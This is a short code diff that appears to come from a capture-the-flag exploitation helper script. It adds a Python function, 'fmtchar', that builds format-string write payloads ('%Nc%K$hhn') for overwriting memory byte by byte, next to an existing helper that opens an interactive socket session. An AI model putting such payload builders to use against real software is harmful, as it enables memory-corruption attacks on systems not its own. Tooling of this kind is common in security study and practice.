@@ -35,3 +35,12 @@ def inter(sock):
     t = telnetlib.Telnet()
     t.sock = sock
     t.interact()
+
+#fmt
+def fmtchar(prev_word,word,index):
+    if word - prev_word > 0 :
+        result = word - prev_word 
+    else :
+        result = 256 - prev_word + word
+    fmt = "%" + str(result) + "c" + "%" + str(index) + "$hhn"
+    return fmt
